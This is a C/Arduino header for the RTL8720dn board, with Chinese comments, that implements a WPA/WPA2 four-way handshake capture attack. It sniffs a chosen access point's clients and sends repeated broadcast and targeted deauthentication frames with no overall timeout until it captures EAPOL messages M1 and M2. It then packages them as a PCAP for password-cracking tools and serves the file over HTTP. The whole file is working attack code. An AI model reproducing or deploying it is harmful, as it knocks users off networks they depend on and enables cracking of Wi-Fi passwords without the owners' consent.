/*
 * handshake.h —— WPA/WPA2 四次握手抓取模块
 *
 * 改编自 RTL8720dn-Handshake-Capture (Cancro29 / Nickguitar)。
 * 原理：对选中的目标 AP 发送 deauth 帧，迫使其客户端断开并重连；
 *       重连过程中设备进入混杂模式嗅探 EAPOL 帧，凑齐四次握手后生成 PCAP。
 *
 * 本模块复用主程序 wifi.ino 中定义的 WiFiScanResult 结构与 scan_results 列表，
 * 以及 SoftAP 信道 ap_channel。因此必须在 wifi.ino 中这些定义之后再 #include。
 */
#ifndef HANDSHAKE_H
#define HANDSHAKE_H

// ---- 引用主程序中的类型与全局状态 ----
struct WiFiScanResult;                      // 前向声明(真正定义在 wifi.ino)
extern std::vector<WiFiScanResult> scan_results;
extern int ap_channel;

// ---- 抓取参数 ----
#define MAX_FRAME_SIZE 512         // 单帧最大缓存字节数
#define MAX_HANDSHAKE_FRAMES 4     // 完整四次握手需要 4 个 EAPOL 帧
#define MAX_MANAGEMENT_FRAMES 10   // 额外保存的信标/探测响应帧，便于后续解析

// ---- 模块状态标志(供 wifi.ino 使用) ----
bool readyToSniff = false;          // 网页点击“抓取握手包”后置位，主循环据此触发一次抓取
bool readyToScanClients = false;    // 网页点击“检测在线客户端”后置位，主循环据此触发一次探测
bool isHandshakeCaptured = false;   // 是否已成功抓到完整握手
bool hasTarget = false;             // 是否已选定抓包目标

// 抓包的单个目标(信道 + BSSID)
uint8_t hs_target_bssid[6] = {0, 0, 0, 0, 0, 0};
uint8_t hs_target_channel = 1;
String hs_target_ssid = "";

// 本模块内部使用的 deauth 变量(与攻击模块的全局变量区分开)
static uint8_t hs_deauth_bssid[6] = {0, 0, 0, 0, 0, 0};
static uint16_t hs_deauth_reason;

std::vector<uint8_t> pcapData;  // 生成的 PCAP 字节流

// 诊断计数：一次抓包周期内回调收到的总帧数 / 目标相关数据帧数 / EAPOL 帧数
volatile uint32_t dbg_total_frames = 0;
volatile uint32_t dbg_target_data = 0;
volatile uint32_t dbg_eapol_frames = 0;

// ---- 在线客户端(STA)检测 ----
#define MAX_CLIENTS 16   // 单个目标最多记录的在线客户端数量

// 一个在线客户端：MAC 地址 + 可读字符串
struct ClientInfo {
  uint8_t mac[6];
  String mac_str;
};
std::vector<ClientInfo> onlineClients;  // 当前目标探测到的在线客户端列表
bool collectClients = false;            // 嗅探回调是否正在统计客户端(探测阶段置位)
bool clientScanDone = false;            // 是否已对当前目标做过一次在线检测

// 把 6 字节 MAC 转成可读字符串 AA:BB:CC:DD:EE:FF
static String macToStr(const uint8_t *mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

// 把一个客户端 MAC 加入列表(去重 + 过滤广播/组播)
static void addClientMac(const uint8_t *mac) {
  // 过滤全 0、广播(FF:FF:FF:FF:FF:FF)和组播地址(最低位为 1)
  bool allZero = true;
  for (int i = 0; i < 6; i++) if (mac[i] != 0) { allZero = false; break; }
  if (allZero) return;
  if (mac[0] & 0x01) return;  // 组播/广播位

  for (auto &c : onlineClients) {
    if (memcmp(c.mac, mac, 6) == 0) return;  // 已存在则不重复加入
  }
  if (onlineClients.size() >= MAX_CLIENTS) return;
  ClientInfo ci;
  memcpy(ci.mac, mac, 6);
  ci.mac_str = macToStr(mac);
  onlineClients.push_back(ci);
}

// 记录四次握手中各 message 是否已抓到(下标 1~4 有效)
bool gotMessage[5] = {false, false, false, false, false};

// 是否拿到【最佳】握手对 M1+M2：ANonce(来自M1) + SNonce/MIC(来自M2)，
// 破解工具兼容性最好。抓包以此为成功标准，没凑齐就继续 deauth 重试。
static bool hasBestHandshake() {
  return gotMessage[1] && gotMessage[2];
}

// 是否拿到【次优】握手对 M2+M3(M3 也含 ANonce)。部分工具可用，但不如 M1+M2 稳。
static bool hasFallbackHandshake() {
  return gotMessage[2] && gotMessage[3];
}

// 兼容旧调用：是否有任何可用握手(最佳或次优)
static bool hasUsableHandshake() {
  return hasBestHandshake() || hasFallbackHandshake();
}

// ---- 握手帧存储结构 ----
struct HandshakeFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};
struct HandshakeData {
  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
  unsigned int frameCount;
};
HandshakeData capturedHandshake;

struct ManagementFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};
struct ManagementData {
  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
  unsigned int frameCount;
};
ManagementData capturedManagement;

// 嗅探回调需要在 wifi_set_promisc 前声明
void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void *param);

// ---- PCAP 文件头结构 ----
struct PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};
struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// 说明：早期版本曾使用 DLT_IEEE802_11_RADIO(127) + 伪造的 radiotap 头，
// 但破解工具(hashcat / aircrack / Wireless Password Recovery)对此组合解析严格，
// 且 RTL8720dn 混杂模式给出的帧带 4 字节 FCS 未被声明，导致 EAPOL 长度错位、握手识别失败。
// 现改为 DLT_IEEE802_11(105)，直接存裸 802.11 帧(并剥去帧尾 FCS)，兼容性最好。

// ---- 辅助函数 ----

// 查找 LLC+EAPOL 特征(AA AA 03 00 00 00 88 8E)在帧中的起始偏移
unsigned int findEAPOLPayloadOffset(const unsigned char *packet, unsigned int length) {
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  if (length < sig_len) return 0;
  for (unsigned int i = 0; i <= length - sig_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) { match = false; break; }
    }
    if (match) return i;
  }
  return 0;  // 未找到时返回 0(退化为整帧比较)
}

// 取出 802.11 头的 Sequence Control 字段(假设 24 字节头，位于第 22-23 字节)
unsigned short getSequenceControl(const unsigned char *packet, unsigned int length) {
  if (length < 24) return 0;
  return packet[22] | (packet[23] << 8);
}

// 解析 EAPOL-Key 帧属于四次握手的第几步(返回 1/2/3/4，无法判断返回 0)
// 依据 Key Information 字段(大端 2 字节)中的 ACK / MIC / Install / Secure 位
int getEapolMessageNumber(const unsigned char *packet, unsigned int length) {
  unsigned int off = findEAPOLPayloadOffset(packet, length);
  if (off == 0) return 0;
  // off 指向 LLC(8 字节)起点；其后是 EAPOL 头(4) + Descriptor Type(1) + Key Information(2)
  unsigned int keyInfoPos = off + 8 + 4 + 1;  // = off + 13
  if (keyInfoPos + 1 >= length) return 0;
  unsigned short ki = (packet[keyInfoPos] << 8) | packet[keyInfoPos + 1];  // 大端

  bool install = ki & 0x0040;  // bit 6  Install
  bool ack     = ki & 0x0080;  // bit 7  Key ACK
  bool mic     = ki & 0x0100;  // bit 8  Key MIC
  bool secure  = ki & 0x0200;  // bit 9  Secure

  (void)install;  // 不依赖 Install 位，避免个别实现差异导致误判
  // 仅靠 ACK / MIC / Secure 三位区分四步(WPA/WPA2 四次握手标准组合)：
  if (ack && !mic) return 1;             // M1: AP->STA, 有 ACK 无 MIC
  if (!ack && mic && !secure) return 2;  // M2: STA->AP, 有 MIC、无 ACK、Secure=0
  if (ack && mic) return 3;              // M3: AP->STA, 有 ACK 有 MIC
  if (!ack && mic && secure) return 4;   // M4: STA->AP, 有 MIC、无 ACK、Secure=1
  return 0;
}

// 计算 EAPOL 帧应写入 PCAP 的精确长度(字节)。
// 不盲目剥 FCS，而是依据 EAPOL 头里的 Packet Body Length 字段算出帧真正的结尾，
// 这样无论抓到的裸帧是否带尾部 FCS，写出的 EAPOL 都长度自洽，避免 Wireshark 报 Malformed。
// 若不是 EAPOL 帧或无法解析，返回原长度。
static unsigned int exactFrameLen(const unsigned char *packet, unsigned int length) {
  unsigned int off = findEAPOLPayloadOffset(packet, length);
  if (off == 0) return length;  // 非 EAPOL：原样返回
  // off 指向 LLC(8 字节)，其后 EAPOL 头：Version(1)+Type(1)+BodyLength(2,大端)
  unsigned int lenPos = off + 8 + 2;  // Packet Body Length 字段位置
  if (lenPos + 1 >= length) return length;
  unsigned int bodyLen = (packet[lenPos] << 8) | packet[lenPos + 1];  // 大端
  // 帧真正结尾 = EAPOL 头起点(off+8) + 4(EAPOL 头) + bodyLen
  unsigned int exact = off + 8 + 4 + bodyLen;
  if (exact > length) return length;  // 声明长度异常则回退，避免越界
  if (exact < 24) return length;      // 异常小值回退
  return exact;
}

// 根据已抓取的帧生成 PCAP 字节流
std::vector<uint8_t> generatePcapBuffer() {
  pcapData.clear();

  // 写入全局文件头
  PcapGlobalHeader gh;
  gh.magic_number = 0xa1b2c3d4;  // 小端魔数
  gh.version_major = 2;
  gh.version_minor = 4;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = 65535;
  gh.network = 105;  // DLT_IEEE802_11：裸 802.11 帧，无 radiotap，兼容性最好

  uint8_t *ghPtr = (uint8_t *)&gh;
  for (size_t i = 0; i < sizeof(gh); i++) pcapData.push_back(ghPtr[i]);

  // 写入单个数据包：裸 802.11 帧。对 EAPOL 帧用其头部 Length 字段精确裁剪，
  // 自动去掉尾部多余字节(FCS/padding)，避免 Wireshark 报 Malformed；非 EAPOL 帧原样写入。
  auto writePacket = [&](const uint8_t *packetData, size_t packetLength) {
    size_t len = exactFrameLen(packetData, packetLength);

    PcapPacketHeader ph;
    unsigned long ms = millis();
    ph.ts_sec = ms / 1000;
    ph.ts_usec = (ms % 1000) * 1000;
    ph.incl_len = len;
    ph.orig_len = len;

    uint8_t *phPtr = (uint8_t *)&ph;
    for (size_t i = 0; i < sizeof(ph); i++) pcapData.push_back(phPtr[i]);
    for (size_t i = 0; i < len; i++) pcapData.push_back(packetData[i]);
  };

  // 先写握手帧：按 M1~M4 固定槽位(slot = msg-1)写入已抓到的那几步，顺序即 M1,M2,M3,M4
  for (int m = 1; m <= 4; m++) {
    if (gotMessage[m]) {
      int slot = m - 1;
      writePacket(capturedHandshake.frames[slot].data, capturedHandshake.frames[slot].length);
    }
  }
  // 再写管理帧(目标 beacon/probe)
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++)
    writePacket(capturedManagement.frames[i].data, capturedManagement.frames[i].length);

  return pcapData;
}

// 清空握手与管理帧缓存
void resetCaptureData() {
  capturedHandshake.frameCount = 0;
  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
  capturedManagement.frameCount = 0;
  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
  for (int i = 0; i < 5; i++) gotMessage[i] = false;  // 清空各 message 捕获标志
}

// ---- 供 wifi.ino 调用的接口 ----

// 选定抓包目标(按 scan_results 下标)
void selectTarget(int idx) {
  memcpy(hs_target_bssid, scan_results[idx].bssid, 6);
  hs_target_channel = scan_results[idx].channel;
  hs_target_ssid = scan_results[idx].ssid;
  hasTarget = true;
  // 更换目标后清掉旧的抓取结果与在线客户端列表
  resetCaptureData();
  isHandshakeCaptured = false;
  onlineClients.clear();
  clientScanDone = false;
}

bool hasSelectedTarget() { return hasTarget; }

// 从帧控制字段提取类型与子类型
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
  unsigned short fc = packet[0] | (packet[1] << 8);
  type = (fc >> 2) & 0x03;     // bit 2-3
  subtype = (fc >> 4) & 0x0F;  // bit 4-7
}

// 混杂模式嗅探回调：筛选并保存信标/探测响应与 EAPOL 握手帧
void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void *param) {
  (void)param;  // 回调签名固定要求该形参，此处未使用
  dbg_total_frames++;  // 诊断：统计回调收到的所有帧
  unsigned int type, subtype;
  get_frame_type_subtype(packet, type, subtype);

  // 诊断：统计与目标 BSSID 相关的数据帧(用于判断“目标下是否有流量/客户端”)
  if (type == 2 && length >= 24) {
    if (memcmp(packet + 4, hs_target_bssid, 6) == 0 ||
        memcmp(packet + 10, hs_target_bssid, 6) == 0 ||
        memcmp(packet + 16, hs_target_bssid, 6) == 0) {
      dbg_target_data++;
    }
  }

  // ---- 在线客户端统计(仅在探测阶段，且为数据帧时) ----
  // 数据帧(type==2)头部至少 24 字节，含 addr1/addr2/addr3
  if (collectClients && type == 2 && length >= 24) {
    // 取 ToDS / FromDS 两个方向标志位(Frame Control 第 1 字节的 bit0/bit1)
    bool toDS = packet[1] & 0x01;
    bool fromDS = packet[1] & 0x02;
    const uint8_t *addr1 = packet + 4;   // 接收地址
    const uint8_t *addr2 = packet + 10;  // 发送地址
    if (toDS && !fromDS) {
      // 上行：addr1=AP(BSSID)，addr2=客户端
      if (memcmp(addr1, hs_target_bssid, 6) == 0) addClientMac(addr2);
    } else if (!toDS && fromDS) {
      // 下行：addr1=客户端，addr2=AP(BSSID)
      if (memcmp(addr2, hs_target_bssid, 6) == 0) addClientMac(addr1);
    }
  }

  // 管理帧：只保存【目标 AP】的信标(8)/探测响应(5)，供破解工具关联 SSID。
  // beacon/probe 帧的 addr3(BSSID) 位于第 16~21 字节，必须等于目标 BSSID，
  // 否则会把空中所有 AP 的 beacon 都塞进来，污染 PCAP。
  if (type == 0 && (subtype == 8 || subtype == 5) && length >= 22) {
    const uint8_t *bssid = packet + 16;  // addr3
    if (memcmp(bssid, hs_target_bssid, 6) == 0 &&
        capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
      ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
      mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
      memcpy(mf->data, packet, mf->length);
      capturedManagement.frameCount++;
    }
  }

  // 判断是否为 EAPOL 帧(含 LLC+EAPOL 特征)
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  bool isEAPOL = false;
  if (length >= seq_len) {
    for (unsigned int i = 0; i <= length - seq_len; i++) {
      bool match = true;
      for (unsigned int j = 0; j < seq_len; j++) {
        if (packet[i + j] != eapol_sequence[j]) { match = false; break; }
      }
      if (match) { isEAPOL = true; break; }
    }
  }

  if (isEAPOL) {
    dbg_eapol_frames++;  // 诊断：统计抓到的 EAPOL 帧

    unsigned int flen = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;

    // 先识别该帧是四次握手的第几步(不受存储槽位限制，保证每种 message 都能被记录)
    int msg = getEapolMessageNumber(packet, length);
    if (msg >= 1 && msg <= 4) {
      // 【按 message 编号索引存储】frames[0]=M1, [1]=M2, [2]=M3, [3]=M4，
      // 每种 message 只保留最新的一个。这样 M1/M3 不会占满槽位把 M2/M4 挤掉——
      // 这正是之前“抓到一堆 EAPOL 却只认出 M1/M3、永远凑不齐握手对”的根因。
      int slot = msg - 1;
      memcpy(capturedHandshake.frames[slot].data, packet, flen);
      capturedHandshake.frames[slot].length = flen;
      if (!gotMessage[msg]) {
        gotMessage[msg] = true;
        // 日志：打印 message 号 + Key Information 原始值(16进制)，便于核对分类是否正确
        unsigned int off = findEAPOLPayloadOffset(packet, length);
        unsigned int kiPos = off + 13;
        unsigned short ki = (kiPos + 1 < length) ? ((packet[kiPos] << 8) | packet[kiPos + 1]) : 0;
        Serial.print("抓到握手 message ");
        Serial.print(msg);
        Serial.print("  (KeyInfo=0x");
        Serial.print(ki, HEX);
        Serial.print(", 帧长=");
        Serial.print(length);
        Serial.println(")");
      }
      // frameCount 记录已集齐的不同 message 数量(供页面显示)
      unsigned int cnt = 0;
      for (int m = 1; m <= 4; m++) if (gotMessage[m]) cnt++;
      capturedHandshake.frameCount = cnt;

      if (hasBestHandshake()) {
        Serial.println("✓ 已抓到最佳握手对 M1+M2(含 ANonce/SNonce/MIC)!");
      } else if (hasFallbackHandshake()) {
        Serial.println("△ 已抓到次优握手对 M2+M3(缺 M1，继续尝试补 M1)");
      }
    }
  }
}

// 探测目标 AP 当前的在线客户端：纯嗅探不发包，统计与目标 BSSID 通信的数据帧
// durationMs：探测持续时间(毫秒)。结束后结果保存在 onlineClients 中。
void scanOnlineClients(unsigned long durationMs = 4000) {
  onlineClients.clear();
  collectClients = true;

  wifi_set_channel(hs_target_channel);  // 切到目标信道监听
  Serial.print("开始检测在线客户端，目标信道: ");
  Serial.println(hs_target_channel);

  // 开启混杂模式(保持 SoftAP 不断)，只收包不发 deauth
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);

  // 全程固定在目标信道监听(异步探测，期间热点掉线可接受)，保证统计准确
  unsigned long start = millis();
  while (millis() - start < durationMs) {
    delay(16);
  }

  // 关闭混杂模式，回到热点信道
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  wifi_set_channel(ap_channel);

  collectClients = false;
  clientScanDone = true;
  readyToScanClients = false;

  Serial.print("检测完成，在线客户端数量: ");
  Serial.println(onlineClients.size());
  for (auto &c : onlineClients) Serial.println("  " + c.mac_str);
}

// 核心：对选定目标执行一轮 deauth + 嗅探(阻塞约 10 秒)
void deauthAndSniff() {
  resetCaptureData();

  memcpy(hs_deauth_bssid, hs_target_bssid, 6);
  wifi_set_channel(hs_target_channel);  // 切到目标信道
  Serial.print("开始抓包，目标信道: ");
  Serial.println(hs_target_channel);

  // 清零诊断计数
  dbg_total_frames = 0;
  dbg_target_data = 0;
  dbg_eapol_frames = 0;

  // 抓包全程统计在线客户端
  collectClients = true;

  // 开启混杂模式并【全程固定在目标信道】。
  // 四次握手在客户端重连后几十毫秒内完成，期间必须一直监听目标信道。
  wifi_set_channel(hs_target_channel);
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);

  // 【持续抓取模式】不设总超时：一直 deauth + 监听，每 5 秒打印一次进度，
  // 直到抓到最佳握手对 M1+M2(且有 beacon)才自动停；否则一直跑，由用户手动重启设备。
  Serial.println(F("进入持续抓包，每 5 秒报告进度；抓到 M1+M2 自动停，否则请手动重启设备。"));
  unsigned long lastDeauth = 0;
  unsigned long lastReclear = 0;
  unsigned long lastReport = millis();
  while (!(hasBestHandshake() && capturedManagement.frameCount > 0)) {

    // ---- deauth：每约 500ms 发一轮，广播 + 定向(针对每个在线客户端)双管齐下 ----
    if (millis() - lastDeauth >= 500) {
      lastDeauth = millis();
      for (int r = 0; r < 6; r++) {
        // 广播 deauth：踢掉该 AP 下所有客户端
        hs_deauth_reason = 1;
        wifi_tx_deauth_frame(hs_deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", hs_deauth_reason);
        hs_deauth_reason = 7;
        wifi_tx_deauth_frame(hs_deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", hs_deauth_reason);
        // 定向 deauth：对已探测到的每个在线客户端单独发，命中率更高。
        // 用索引+快照大小遍历(回调可能同时在往 onlineClients 追加，避免迭代器失效)。
        size_t n = onlineClients.size();
        for (size_t k = 0; k < n && k < MAX_CLIENTS; k++) {
          wifi_tx_deauth_frame(hs_deauth_bssid, (void *)onlineClients[k].mac, 7);
        }
        delay(2);
      }
    }

    // 每 5 秒打印一次进度(帧数 / EAPOL / 已集齐的握手步)
    if (millis() - lastReport >= 5000) {
      lastReport = millis();
      Serial.print(F("[进度] 总帧="));   Serial.print(dbg_total_frames);
      Serial.print(F(" 目标数据帧="));    Serial.print(dbg_target_data);
      Serial.print(F(" EAPOL="));         Serial.print(dbg_eapol_frames);
      Serial.print(F(" 在线客户端="));    Serial.print((unsigned)onlineClients.size());
      Serial.print(F(" M1-M4="));
      for (int m = 1; m <= 4; m++) Serial.print(gotMessage[m] ? '1' : '0');
      Serial.println();
      if (dbg_eapol_frames == 0) {
        Serial.println(F("  提示：还没抓到 EAPOL —— 客户端可能没被踢下线重连，正在持续 deauth…"));
      }
    }

    // 若已抓到 M2/M3/M4 却一直缺 M1，每 5 秒清空重来，强制从头等完整握手
    if (!gotMessage[1] && (gotMessage[2] || gotMessage[3] || gotMessage[4]) &&
        millis() - lastReclear >= 5000) {
      lastReclear = millis();
      for (int m = 1; m <= 4; m++) gotMessage[m] = false;
      capturedHandshake.frameCount = 0;
      Serial.println(F("  缺 M1，清空重来，等待下一次完整握手…"));
    }

    delay(10);  // 其余时间持续监听(回调在后台收包)
  }

  // 关闭混杂模式，回到热点信道(先关再打印，避免打印期间继续回调)
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  wifi_set_channel(ap_channel);

  // ---- 诊断汇总(从串口可判断问题出在哪一环) ----
  Serial.println(F("====== 抓包诊断 ======"));
  Serial.print(F("回调收到总帧数: ")); Serial.println(dbg_total_frames);
  Serial.print(F("目标相关数据帧: ")); Serial.println(dbg_target_data);
  Serial.print(F("抓到 EAPOL 帧数: ")); Serial.println(dbg_eapol_frames);
  Serial.print(F("保存的目标 beacon 数: ")); Serial.println(capturedManagement.frameCount);
  Serial.print(F("握手各步 M1-M4: "));
  for (int m = 1; m <= 4; m++) { Serial.print(gotMessage[m] ? '1' : '0'); Serial.print(' '); }
  Serial.println();
  if (dbg_total_frames == 0) {
    Serial.println(F("诊断：回调一帧都没收到 —— 混杂模式可能未生效或信道不对"));
  } else if (dbg_target_data == 0) {
    Serial.println(F("诊断：收到帧但目标无数据流量 —— 目标下可能没有活跃客户端，先用“检测在线客户端”确认"));
  } else if (dbg_eapol_frames == 0) {
    Serial.println(F("诊断：目标有流量但没抓到 EAPOL —— 客户端未重连或握手发生在监听之外"));
  }
  Serial.println(F("======================"));

  // 生成 PCAP 并给出可用性分级：
  //  - M1+M2：最佳，破解工具普遍可用
  //  - 仅 M2+M3(缺 M1)：次优，部分工具可能拒绝(第二次失败就是这种情况)
  if (hasBestHandshake() && capturedManagement.frameCount > 0) {
    generatePcapBuffer();
    isHandshakeCaptured = true;
    Serial.print(F("成功！(M1+M2 完整) PCAP 大小: "));
    Serial.print(pcapData.size());
    Serial.println(F(" 字节"));
  } else if (hasFallbackHandshake() && capturedManagement.frameCount > 0) {
    generatePcapBuffer();
    isHandshakeCaptured = true;
    Serial.print(F("次优：只抓到 M2+M3，缺 M1，部分破解工具可能不认。PCAP 大小: "));
    Serial.print(pcapData.size());
    Serial.println(F(" 字节。建议重抓以获取 M1+M2。"));
  } else {
    isHandshakeCaptured = false;
    Serial.println(F("本轮未抓到可用握手(至少需 M1+M2，可重试)"));
  }

  collectClients = false;
  clientScanDone = true;  // 抓包过程也已统计过在线客户端
  readyToSniff = false;
}

// 以附件形式分块发送 PCAP 文件
void servePcap(WiFiClient &client) {
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: application/octet-stream");
  client.println("Content-Disposition: attachment; filename=\"handshake.pcap\"");
  client.println("Connection: close");
  client.println();

  size_t chunkSize = 1460;  // 按 TCP MSS 分块发送
  for (size_t i = 0; i < pcapData.size(); i += chunkSize) {
    size_t currentChunkSize = (chunkSize < pcapData.size() - i) ? chunkSize : (pcapData.size() - i);
#ifdef write
#undef write
#endif
    client.write(pcapData.data() + i, currentChunkSize);
  }
}

#endif  // HANDSHAKE_H
